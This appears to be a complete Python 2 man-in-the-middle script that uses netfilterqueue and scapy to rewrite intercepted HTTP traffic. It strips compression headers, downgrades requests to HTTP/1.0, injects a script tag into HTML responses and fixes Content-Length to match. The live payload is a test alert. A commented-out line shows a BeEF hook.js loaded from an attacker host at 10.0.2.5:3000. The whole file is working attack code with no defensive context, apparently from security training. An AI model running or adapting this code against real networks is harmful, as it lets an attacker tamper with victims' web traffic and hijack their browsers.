# netfilterqueue has some issues with pyhton3, so using python2 to run this script
import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())#convert packet to scapy packet
    if scapy_packet.haslayer(scapy.Raw):#Raw layer contain the http data
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)#delete Accept-Encoding field to let the server     send response in plain text
            load = load.replace("HTTP/1.1", "HTTP/1.0")#bypass chunks data

        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] Response")
            #print(scapy_packet.show())
            #injection_code = '<script src="http://10.0.2.5:3000/hook.js"></script>'
            injection_code = '<script>alert("test");</script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)#Content-Length will limit the code injection 
            if content_length_search and "text/html" in load:#just work for Content-Type:text/html and message css javascript have no </body>
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:#if load changed, than update the load
            new_packet = set_load(scapy_packet, load)#work for scapy_packet
            packet.set_payload(str(new_packet))#scapy_packet to normal packet

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

